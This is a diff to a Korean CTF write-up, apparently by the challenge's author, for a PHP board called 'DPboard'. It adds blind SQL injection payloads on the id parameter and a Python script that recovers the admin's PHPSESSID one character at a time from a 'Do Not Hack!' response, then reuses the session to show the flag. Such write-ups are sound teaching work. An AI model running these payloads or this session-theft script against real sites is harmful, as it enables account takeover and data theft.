@@ -82,7 +82,66 @@ title과 hidden값인 id를 가져온 후 id와 title에 해당하는 값을 DB�
 미리 DB에 저장해 둔 admin의 PHPSESSID와 비교하여 일치할 때만 플래그를 보여주도록 했습니다.
 그렇지 않으면 substr로 한 글자만 맞춰도 플래그가 뜨기 때문에 너무 쉽잖아요!
 
+substr을 이용해 `ip/DPboard/dpboard.php?title=flag&id=1' or title='flag' and substr(id,1,1)='m` 또는
+`ip/DPboard/dpboard.php?title=flag&id=1' or title='flag' and length(id)='26` 을 입력하게 되면
+다음과 같이 `Do Not Hack!` 이라는 문구가 뜹니다.
+![]({{ site.baseurl }}/images/mitny/DPboard/dp5.PNG)
+
+PHPSESSID의 길이도 길이고 한 글자씩 맞춰보기엔 오래 걸리니 파이썬으로 코드를 짜서 플래그를 알아내보도록 하겠습니다.
+
+```py
+from requests import get
+import string
+from time import sleep
 
 
+url = "ip/DPboard/dpboard.php"
+adminSessid = ""
+
+alpha = string.ascii_letters+string.digits
+result = ""
+
+print("\n\n.*.*.*.*.*.*.*.Finding admin id.*.*.*.*.*.*.*.\n")
+length = 27
+for i in range(1, length):
+    for a in alpha:
+        parameter = "?title=flag&id=1' or title='flag' and ASCII(substr(id,"+ str(i)+",1))="+str(ord(a))+"%23"
+        new_url = url + parameter
+        cookies = dict(PHPSESSID=adminSessid)
+        r = get(new_url, cookies=cookies)
+
+        if r.text.find("<marquee>Do Not Hack!</marquee>") > 0:
+            print(str(i) + " -> " + a)
+            sleep(0.5)
+            result += a
+            break
+
+    if i == 1 and result == "":
+        print("id not found")
+        exit(0)
+
+    if i == length-1:
+        print("\n"+"id is " + result)
+        adminSessid = result
+        print("\n")
+        cookies = dict(PHPSESSID=result)
+        req = get(new_url,cookies=cookies)
+        print(req.text)
+```
+
+PHPSESSID이기 때문에 딱히 특수문자까지 찾도록 하진 않았습니다.
+`?title=flag&id=1' or title='flag' and ASCII(substr(id,"+ str(i)+",1))="+str(ord(a))+"%23` 와 같이
+substr을 통해 한글자씩 맞추게 됩니다.
+admin의 flag에 접근하려고 할 때 user의 PHPSESSID가 DB에 저장되어 있는 admin의 PHPSESSID와 같지 않으면
+`Do Not Hack!` 메시지를 뱉기 때문에 이를 이용했습니다.
+"Do Not Hack!" 이 뜰 때는 admin의 PHPSESSID 중 한 글자가 맞는다는 의미이므로 이 문구가 뜰 때
+result에 해당 값을 붙여 줍니다.
+그 후에 PHPSESSID를 result 값으로 주고 get을 이용해 new_url과 cookies 값을 넘겨줍니다.
+req.text로 html 코드를 가져오면 플래그가 보입니다!
 
 
+### 결과
+
+![]({{ site.baseurl }}/images/mitny/DPboard/dp6.PNG)
+
+![]({{ site.baseurl }}/images/mitny/DPboard/dp7.PNG)
